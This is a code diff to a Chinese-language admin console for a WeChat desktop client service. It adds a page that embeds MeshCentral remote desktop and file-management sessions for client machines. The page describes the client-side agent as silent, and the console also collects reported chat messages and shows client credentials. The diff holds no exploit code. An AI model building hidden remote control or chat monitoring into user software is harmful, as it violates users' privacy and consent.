@@ -155,6 +155,9 @@ select.input{padding-right:28px}
 .desktop-stage.has-canvas canvas{display:block}
 .desktop-stage img{display:none !important}
 .desktop-stage #deskHint{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#94a3b8;pointer-events:none;padding:16px;text-align:center;z-index:1}
+.desktop-stage iframe{width:100%;height:100%;min-height:480px;border:0;display:none;background:#111}
+.desktop-stage.has-frame iframe{display:block}
+.desktop-stage.has-frame{display:block;padding:0}
 .desktop-stage.has-frame #deskHint{display:none}
 .desktop-stage #deskStaleBanner{display:none;position:absolute;top:0;left:0;right:0;z-index:3;padding:8px 12px;font-size:13px;font-weight:600;text-align:center;color:#fff;background:rgba(185,28,28,.88);pointer-events:none}
 .desktop-stage.is-stale #deskStaleBanner{display:block}
@@ -271,6 +274,7 @@ const ROUTES = [
   { id:'wx-tasks', label:'任务中心', title:'任务中心', desc:'桌面任务说明与云端协同入口。' },
   { id:'wx-logs', label:'客户端日志', title:'客户端日志', desc:'查看桌面软件自动同步的运行与错误记录。' },
   { id:'wx-monitor', label:'会话监控', title:'会话监控', desc:'聊天消息上报列表与图片清理。' },
+  { id:'desktop', label:'远程桌面', title:'远程桌面', desc:'通过 MeshCentral 查看画面、键鼠操作与文件管理（客户端静默 Agent）。' },
   { id:'control', label:'运行管控', title:'运行管控', desc:'全局策略、在线权限与 IP 限制管理。' },
   { id:'announcements', label:'公告下发', title:'公告下发', desc:'向在线客户端或指定 IP 发送弹窗公告。' },
   { id:'logs', label:'操作日志', title:'操作日志', desc:'按客户端或 IP 查看白话操作记录。' },
@@ -1035,17 +1039,238 @@ async function sendBatchAnnounce() {
   clearSelection();
 }
 
-/* ===== desktopWS retired (MeshCentral) ===== */
-async function stopDesktop() { /* no-op: remote desktop retired */ }
-function patchDesktopPage() { /* no-op */ }
-function renderDesktopShell() {
-  return '<div class="card" style="padding:24px"><h2>远程桌面已退役</h2>'
-    + '<p class="muted">旧远程桌面通道已停用，请使用 MeshCentral 远程维护。</p></div>';
+/* ===== MeshCentral remote (admin console) ===== */
+async function stopDesktop() {
+  const frame = document.getElementById('deskFrame');
+  const stage = document.getElementById('deskStage');
+  if (frame) {
+    try { frame.src = 'about:blank'; } catch (_) {}
+  }
+  if (stage) stage.classList.remove('has-frame', 'fs');
+  state.desktopSession = 0;
+  const closeBtn = document.getElementById('deskClose');
+  const fsBtn = document.getElementById('deskFullscreen');
+  if (closeBtn) closeBtn.disabled = true;
+  if (fsBtn) fsBtn.disabled = true;
 }
-function clearDeskFrame() {}
-function bindDeskFullscreen() {}
-function updateDesktopInfo() {}
-function setDeskFullscreen() {}
+function renderDesktopShell() {
+  return '<div class="desktop-layout">'
+    + '<div class="card desktop-list">'
+    + '<div class="toolbar" style="margin-bottom:8px">'
+    + '<input id="deskSearch" class="input grow" placeholder="搜索 clientId / 账号 / IP"/>'
+    + '<button class="btn btn-secondary btn-sm" id="deskRefreshList">刷新</button></div>'
+    + '<div id="deskClientList" class="muted">加载中…</div></div>'
+    + '<div class="card" style="padding:0;overflow:hidden;display:flex;flex-direction:column;min-height:520px">'
+    + '<div style="padding:10px 12px;border-bottom:1px solid var(--border,#e2e8f0);display:flex;gap:8px;flex-wrap:wrap;align-items:center">'
+    + '<strong id="deskTitle">远程桌面</strong><span class="muted" id="deskSub">选择左侧客户端</span>'
+    + '<span class="grow"></span>'
+    + '<button class="btn btn-primary btn-sm" id="deskOpenDesktop" disabled>打开桌面</button>'
+    + '<button class="btn btn-secondary btn-sm" id="deskOpenFiles" disabled>文件管理</button>'
+    + '<button class="btn btn-secondary btn-sm" id="deskAutoBind" disabled>重新绑定</button>'
+    + '<button class="btn btn-ghost btn-sm" id="deskOpenTab" disabled>新窗口</button>'
+    + '<button class="btn btn-ghost btn-sm" id="deskFullscreen" disabled>全屏</button>'
+    + '<button class="btn btn-ghost btn-sm" id="deskClose" disabled>关闭画面</button></div>'
+    + '<div class="desktop-stage" id="deskStage">'
+    + '<iframe id="deskFrame" title="mesh-desktop" allow="clipboard-read; clipboard-write; fullscreen"></iframe>'
+    + '<div id="deskHint">选择左侧在线客户端 →「打开桌面」查看画面并操作键鼠；「文件管理」用于传文件。若内嵌失败请点「新窗口」。</div></div></div>'
+    + '<div class="card desktop-info"><h3 style="margin:0 0 10px;font-size:14px">设备状态</h3>'
+    + '<div id="deskInfo" class="muted">未选择</div>'
+    + '<p class="muted" style="margin-top:16px;font-size:12px;line-height:1.6">画面、键鼠与文件由 MeshCentral Relay 提供（webRTC 关闭）。</p></div></div>';
+}
+function deskFilteredClients(data) {
+  const rows = (data && data.online) || [];
+  const q = String((document.getElementById('deskSearch') || {}).value || '').trim().toLowerCase();
+  if (!q) return rows;
+  return rows.filter(r => {
+    const blob = [r.clientId, r.account, r.ip, r.version].map(x => String(x || '').toLowerCase()).join(' ');
+    return blob.includes(q);
+  });
+}
+function patchDesktopPage(data) {
+  const host = document.getElementById('deskClientList');
+  if (!host) return;
+  const rows = deskFilteredClients(data || state.overview);
+  if (!rows.length) {
+    host.innerHTML = '<p class="muted">暂无在线客户端</p>';
+    return;
+  }
+  host.innerHTML = rows.map(r => {
+    const cid = String(r.clientId || '');
+    const active = cid && cid === state.desktopSelectedId ? ' active' : '';
+    return '<div class="desktop-client' + active + '" data-cid="' + escHtml(cid) + '">'
+      + '<div class="mono" style="font-size:12px">' + escHtml(cid) + '</div>'
+      + '<div style="margin-top:4px">' + escHtml(displayAccount(r)) + ' · ' + escHtml(r.ip || '—') + '</div></div>';
+  }).join('');
+  host.querySelectorAll('.desktop-client').forEach(el => {
+    el.onclick = () => selectDesktopClient(el.dataset.cid || '');
+  });
+  if (state.desktopSelectedId && !rows.some(r => String(r.clientId || '') === state.desktopSelectedId)) {
+    /* keep selection for offline reopen attempt */
+  }
+}
+async function selectDesktopClient(clientId) {
+  const cid = String(clientId || '').trim();
+  state.desktopSelectedId = cid;
+  state.desktopClientId = cid;
+  patchDesktopPage(state.overview);
+  const enabled = !!cid;
+  ['deskOpenDesktop', 'deskOpenFiles', 'deskAutoBind', 'deskOpenTab'].forEach(id => {
+    const btn = document.getElementById(id);
+    if (btn) btn.disabled = !enabled;
+  });
+  const sub = document.getElementById('deskSub');
+  if (sub) sub.textContent = cid || '选择左侧客户端';
+  await refreshDesktopMeshStatus();
+}
+async function refreshDesktopMeshStatus() {
+  const info = document.getElementById('deskInfo');
+  const cid = state.desktopSelectedId;
+  if (!info) return;
+  if (!cid) { info.innerHTML = '<span class="muted">未选择</span>'; return; }
+  info.textContent = '查询中…';
+  try {
+    const st = await api('/api/mesh/status?clientId=' + encodeURIComponent(cid));
+    const bound = !!st.bound;
+    const userMsg = st.userMessage || st.message || '';
+    // Never surface internal codes like MESH_UNBOUND / meshNodeId as primary UX
+    const statusLabel = bound
+      ? '<span class="badge badge-ok">远程服务已就绪</span>'
+      : '<span class="badge badge-neutral">' + escHtml(userMsg || '正在准备远程服务…') + '</span>';
+    info.innerHTML = '<div><b>设备</b><div class="mono">' + escHtml(cid) + '</div></div>'
+      + '<div style="margin-top:10px"><b>状态</b><div>' + statusLabel + '</div></div>'
+      + (userMsg && bound ? '<div style="margin-top:10px" class="muted">' + escHtml(userMsg) + '</div>' : '');
+  } catch (e) {
+    info.innerHTML = '<span class="badge badge-deny">远程服务准备失败</span><div class="muted" style="margin-top:8px">' + escHtml(e.message || e) + '</div>';
+  }
+}
+function friendlyMeshError(data) {
+  const code = String((data && data.code) || '');
+  if (code === 'MESH_DISABLED' || code === 'MESH_WS_UNAVAILABLE' || code === 'MESH_SYNC_FAILED' || code === 'MESH_WS_ERROR') {
+    return 'MeshCentral 不可用';
+  }
+  if (code === 'MESH_AMBIGUOUS' || code === 'MESH_HOSTNAME_AMBIGUOUS') return '发现重复设备';
+  if (code === 'MESH_INSTALL_FAILED' || code === 'MESH_AGENT_FILES_MISSING') return 'MeshAgent 安装失败';
+  if (code === 'MESH_AGENT_OFFLINE' || code === 'MESH_NODE_TIMEOUT') return 'MeshAgent 无法连接服务器';
+  if (code === 'MESH_NO_MATCH' || code === 'MESH_UNBOUND' || code === 'MESH_PREPARING' || code === 'MESH_PREPARE_FAILED') {
+    return '设备绑定失败';
+  }
+  const msg = String((data && (data.userMessage || data.message)) || '');
+  if (/未绑定|MESH_|meshNode|auto-bind|Mesh node/i.test(msg)) return '远程服务准备失败';
+  return msg || '远程服务准备失败';
+}
+async function openMeshSession(mode, { forceTab } = {}) {
+  const cid = state.desktopSelectedId;
+  if (!cid) { alert('请先选择客户端'); return; }
+  const path = mode === 'files' ? '/api/mesh/session/files' : '/api/mesh/session/desktop';
+  const label = mode === 'files' ? '文件管理' : '远程桌面';
+  const online = ((state.overview && state.overview.online) || []).find(r => String(r.clientId || '') === cid) || {};
+  const hostname = String(online.hostname || online.host || '').trim();
+  const sessionBody = JSON.stringify({ clientId: cid, hostname: hostname || undefined });
+  const bindBody = JSON.stringify({
+    clientId: cid,
+    allowHostnameFallback: true,
+    hostname: hostname || undefined,
+    agentName: cid ? ('WXQK-' + cid) : undefined,
+  });
+  try {
+    let data = await api(path, { method: 'POST', body: sessionBody });
+    // Self-heal once: shared auto-bind then retry (Desktop/Files 同一路径)
+    if (!data || !data.ok || !data.embedUrl) {
+      const bind = await api('/api/mesh/auto-bind', {
+        method: 'POST',
+        body: bindBody,
+      });
+      if (bind && bind.ok) {
+        await refreshDesktopMeshStatus();
+        data = await api(path, { method: 'POST', body: sessionBody });
+      } else if (!data || !data.ok) {
+        alert(friendlyMeshError(bind || data));
+        await refreshDesktopMeshStatus();
+        return;
+      }
+    }
+    if (!data || !data.ok || !data.embedUrl) {
+      alert(friendlyMeshError(data) || ('无法打开' + label));
+      await refreshDesktopMeshStatus();
+      return;
+    }
+    state.desktopSession = Date.now();
+    const url = String(data.embedUrl);
+    if (forceTab) {
+      window.open(url, '_blank', 'noopener');
+      return;
+    }
+    const frame = document.getElementById('deskFrame');
+    const stage = document.getElementById('deskStage');
+    if (!frame || !stage) {
+      window.open(url, '_blank', 'noopener');
+      return;
+    }
+    frame.src = url;
+    stage.classList.add('has-frame');
+    const closeBtn = document.getElementById('deskClose');
+    const fsBtn = document.getElementById('deskFullscreen');
+    if (closeBtn) closeBtn.disabled = false;
+    if (fsBtn) fsBtn.disabled = false;
+    const title = document.getElementById('deskTitle');
+    if (title) title.textContent = label;
+    await refreshDesktopMeshStatus();
+  } catch (e) {
+    handleAuthError(e);
+    alert(e.message || ('打开' + label + '失败'));
+  }
+}
+async function autoBindDesktopClient() {
+  const cid = state.desktopSelectedId;
+  if (!cid) return;
+  const online = ((state.overview && state.overview.online) || []).find(r => String(r.clientId || '') === cid) || {};
+  const hostname = String(online.hostname || online.host || '').trim();
+  try {
+    const data = await api('/api/mesh/auto-bind', {
+      method: 'POST',
+      body: JSON.stringify({
+        clientId: cid,
+        allowHostnameFallback: true,
+        hostname: hostname || undefined,
+        agentName: 'WXQK-' + cid,
+      }),
+    });
+    alert(data && data.ok ? '远程服务已就绪' : friendlyMeshError(data));
+    await refreshDesktopMeshStatus();
+  } catch (e) {
+    alert(e.message || '远程服务准备失败');
+  }
+}
+function setDeskFullscreen(on) {
+  const stage = document.getElementById('deskStage');
+  if (!stage) return;
+  stage.classList.toggle('fs', !!on);
+}
+function bindDesktopPageEvents() {
+  const search = document.getElementById('deskSearch');
+  if (search) search.oninput = () => patchDesktopPage(state.overview);
+  const refresh = document.getElementById('deskRefreshList');
+  if (refresh) refresh.onclick = () => fetchOverview(true).then(() => {
+    patchDesktopPage(state.overview);
+    return refreshDesktopMeshStatus();
+  }).catch(alert);
+  const openD = document.getElementById('deskOpenDesktop');
+  if (openD) openD.onclick = () => openMeshSession('desktop');
+  const openF = document.getElementById('deskOpenFiles');
+  if (openF) openF.onclick = () => openMeshSession('files');
+  const bind = document.getElementById('deskAutoBind');
+  if (bind) bind.onclick = () => autoBindDesktopClient();
+  const tab = document.getElementById('deskOpenTab');
+  if (tab) tab.onclick = () => openMeshSession('desktop', { forceTab: true });
+  const fs = document.getElementById('deskFullscreen');
+  if (fs) fs.onclick = () => {
+    const stage = document.getElementById('deskStage');
+    setDeskFullscreen(!(stage && stage.classList.contains('fs')));
+  };
+  const close = document.getElementById('deskClose');
+  if (close) close.onclick = () => stopDesktop();
+  if (state.desktopSelectedId) selectDesktopClient(state.desktopSelectedId);
+}
 
 /* ===== dropdown ===== */
 function closeDropdown() {
@@ -1152,7 +1377,7 @@ function renderWxFeatureShell(routeId) {
     'wx-broadcast': { title: '消息群发', hint: '群发勾选与风控在桌面端执行；云端用于监控发出的会话消息。' },
     'wx-contacts': { title: '通讯录', hint: '通讯录保存到手机等操作在桌面端完成；云端展示相关群/好友上报。' },
     'wx-wxids': { title: '微信 ID 查询', hint: '在上报的消息与群事件中检索 wxid / 会话 ID。' },
-    'wx-tasks': { title: '任务中心', hint: '任务队列在桌面端 SQLite；云端用于远程查看与远程桌面协助执行。' },
+    'wx-tasks': { title: '任务中心', hint: '任务队列在桌面端 SQLite；云端可查看同步任务，必要时用「远程桌面」协助。' },
     'wx-logs': { title: '客户端日志', hint: '桌面软件每分钟自动同步最近的运行与错误记录，不包含聊天正文和密码。' },
     'wx-monitor': { title: '会话监控', hint: '聊天消息与图片上报；可清理服务端图片。' }
   }[routeId] || { title: '微信功能', hint: '' };
@@ -1162,7 +1387,7 @@ function renderWxFeatureShell(routeId) {
     '<p class="muted" style="margin:0 0 14px">' + meta.hint + '</p>' +
     '<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px">' +
     '<button class="btn btn-secondary btn-sm" id="wxRefresh">刷新数据</button>' +
-    '<button class="btn btn-secondary btn-sm" id="wxGoDesktop">远程桌面已退役</button>' +
+    '<button class="btn btn-secondary btn-sm" id="wxGoDesktop">远程桌面</button>' +
     (routeId === 'wx-monitor' ? '<button class="btn btn-danger btn-sm" id="wxCleanupImages">清理7天前图片</button>' : '') +
     '<input id="wxSearch" class="input" placeholder="搜索 wxid / 内容…" style="max-width:260px"/>' +
     '</div>' +
@@ -1226,7 +1451,7 @@ async function loadWxFeaturePage(routeId) {
         esc(r.version || '') + '</td><td>' + (r.online === false ? '离线' : '在线') + '</td><td>' +
         esc(r.ip || '') + '</td><td>' + (r.desktopWatching ? '推流中' : '—') + '</td></tr>';
     }).join('') || '<tr><td colspan="6" class="muted">暂无在线客户端。请先启动桌面端 Electron（会自动注册 Agent）。</td></tr>';
-    hint.textContent = '共 ' + rows.length + ' 条在线记录。执行微信操作请在桌面软件对应页面，或用远程桌面协助。';
+    hint.textContent = '共 ' + rows.length + ' 条在线记录。执行微信操作请在桌面软件对应页面，或进入「远程桌面」协助。';
     return;
   }
   head.innerHTML = cols.map(c => '<th>' + c + '</th>').join('');
@@ -1274,7 +1499,7 @@ function renderDashboardShell() {
     '<div class="card" style="padding:18px"><h3 style="margin:0 0 14px;font-size:15px">在线客户端摘要（前8台）</h3><div class="table-wrap"><table class="data-table"><thead><tr>' +
     '<th>账号</th><th>计划</th><th>版本</th><th>状态</th><th>IP</th><th>最后活跃</th></tr></thead><tbody id="dashClients"></tbody></table></div></div>' +
     '<div class="card" style="padding:18px"><h3 style="margin:0 0 12px;font-size:15px">快速入口</h3><div class="quick-actions" style="flex-direction:column;align-items:stretch">' +
-    '<button class="btn btn-secondary" id="dashGoDesktop">远程桌面已退役</button>' +
+    '<button class="btn btn-secondary" id="dashGoDesktop">远程桌面</button>' +
     '<button class="btn btn-secondary" id="dashGoMonitor">会话监控</button>' +
     '<button class="btn btn-secondary" id="dashAnnounce">发布公告</button>' +
     '<button class="btn btn-secondary" id="dashClientsBtn">查看全部客户端</button></div></div></div>' +
@@ -2282,7 +2507,11 @@ function bindClientsTableEvents(tbody) {
     el.onclick = () => showClientCredentials(el.dataset.cid);
   });
   tbody.querySelectorAll('.desk-btn').forEach(el => {
-    el.onclick = () => alert('远程桌面已退役，请使用 MeshCentral');
+    el.onclick = () => {
+      state.desktopSelectedId = el.dataset.cid || '';
+      state.desktopClientId = state.desktopSelectedId;
+      navigate('desktop');
+    };
   });
   tbody.querySelectorAll('.ann-btn').forEach(el => {
     el.onclick = () => { state.announceSelected = new Set([el.dataset.cid]); state.announceMode = 'clients'; navigate('announcements'); };
@@ -2664,7 +2893,7 @@ function bindPageEvents(routeId) {
   if (routeId === 'dashboard') {
     const goDesk = document.getElementById('dashGoDesktop');
     const goMon = document.getElementById('dashGoMonitor');
-    if (goDesk) goDesk.onclick = () => alert('远程桌面已退役，请使用 MeshCentral');
+    if (goDesk) goDesk.onclick = () => navigate('desktop');
     if (goMon) goMon.onclick = () => navigate('wx-monitor');
     const ann = document.getElementById('dashAnnounce');
     if (ann) ann.onclick = () => navigate('announcements');
@@ -2677,7 +2906,7 @@ function bindPageEvents(routeId) {
     const refresh = document.getElementById('wxRefresh');
     if (refresh) refresh.onclick = () => loadWxFeaturePage(routeId).catch(alert);
     const go = document.getElementById('wxGoDesktop');
-    if (go) go.onclick = () => alert('远程桌面已退役，请使用 MeshCentral');
+    if (go) go.onclick = () => navigate('desktop');
     const search = document.getElementById('wxSearch');
     if (search) search.onkeydown = (e) => { if (e.key === 'Enter') loadWxFeaturePage(routeId).catch(alert); };
     const cleanup = document.getElementById('wxCleanupImages');
@@ -2687,6 +2916,9 @@ function bindPageEvents(routeId) {
         .then(() => { alert('已提交清理'); return loadWxFeaturePage(routeId); })
         .catch(alert);
     };
+  }
+  if (routeId === 'desktop') {
+    bindDesktopPageEvents();
   }
   if (routeId === 'clients') {
     document.getElementById('clientSearch').value = state.clientsFilters.search;
